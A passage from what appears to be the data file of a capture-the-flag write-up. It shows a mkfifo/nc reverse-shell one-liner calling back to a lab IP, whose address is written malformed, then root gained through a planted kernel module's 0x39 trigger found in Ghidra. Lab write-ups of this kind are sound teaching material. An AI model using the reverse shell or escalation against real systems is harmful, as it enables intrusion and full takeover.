    { type: "code", content: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.141.103.2222 >/tmp/f" },
    { type: "text", content: "After adding the payload and waiting for it to run, we catch a callback as `athena`." },
    { type: "image", content: "Pasted image 20260224154700.png", alt: "Shell as athena" },

    { type: "heading", content: "6) Privilege escalation" },
    { type: "text", content: "Now as `athena`, the first check is always `sudo -l` to see what we can run as root." },
    { type: "image", content: "Pasted image 20260224154940.png", alt: "sudo -l output" },
    { type: "text", content: "`insmod` is used to load kernel modules. Seeing a custom `.ko` file here (`/venom.ko`) is a massive hint: it likely contains a built-in root trigger." },
    { type: "text", content: "So I downloaded `/venom.ko` and opened it in Ghidra. In the symbol tree, two functions stand out immediately: `give_root` and `hacked_kill`." },
    { type: "text", content: "give_root" },
    { type: "image", content: "Pasted image 20260224162609.png", alt: "Ghidra: give_root" },
    { type: "text", content: "and hacked_kill" },
    { type: "image", content: "Pasted image 20260224162644.png", alt: "Ghidra: hacked_kill" },
    { type: "text", content: "Following iVar3" },
    { type: "image", content: "Pasted image 20260224162731.png", alt: "Ghidra: PID logic" },
    { type: "text", content: "The logic revolves around a PID, and a special value check. If we trigger it with `0x39` (hex), which is `57` in decimal, it calls `give_root()`." },
    { type: "image", content: "Pasted image 20260224163101.png", alt: "Ghidra: 0x39 trigger" },
    { type: "text", content: "After triggering that path, we get root and can read the final flag." },
    { type: "image", content: "Pasted image 20260224163116.png", alt: "Root obtained / flag read" },
  ],
},

};
